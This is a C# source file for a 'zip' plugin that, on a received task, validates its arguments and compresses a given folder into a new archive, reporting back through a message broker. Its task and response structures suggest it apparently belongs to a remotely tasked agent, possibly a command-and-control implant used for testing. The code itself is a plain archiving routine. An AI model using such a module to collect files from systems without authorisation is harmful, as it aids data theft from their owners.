using System.Diagnostics;
using System.IO.Compression;
using System.Text;
using System.Text.Json;
using Workflow.Contracts;
using Workflow.Models;

namespace Workflow
{
    public class Plugin : IModule
    {
        public string Name => "zip";
        private IDataBroker messageManager { get; set; }
        private IServiceConfig agentConfig { get; set; }
        public Plugin(PluginContext context)
        {
            this.messageManager = context.MessageManager;
            this.agentConfig = context.Config;
        }
        public async Task Execute(ServerJob job)
        {
            DebugLog.Log($"Executing {Name} [{job.task.id}]");
            ZipArgs args = JsonSerializer.Deserialize<ZipArgs>(job.task.parameters);
            // Open a memory stream to write our zip into

            if(args == null || !args.Validate())
            {
                DebugLog.Log($"{Name} validation failed [{job.task.id}]");
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Failed to validate arguments",
                    completed = true,
                    status = "error"
                });
                return;
            }

            if (!Directory.Exists(args.source))
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Source folder doesn't exist",
                    completed = true,
                    status="error"
                });
                return;
            }

            if (File.Exists(args.destination))
            {
                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Destination already exists",
                    completed = true,
                    status = "error",
                });
                return;
            }
            DebugLog.Log($"{Name} creating zip '{args.source}' -> '{args.destination}' [{job.task.id}]");
            ZipFile.CreateFromDirectory(args.source, args.destination, CompressionLevel.SmallestSize, false);
            messageManager.AddTaskResponse(new TaskResponse()
            {
                task_id = job.task.id,
                user_output = $"Zip written to {args.destination}.",
                completed = true
            });
            DebugLog.Log($"{Name} completed [{job.task.id}]");
        }
    }
}
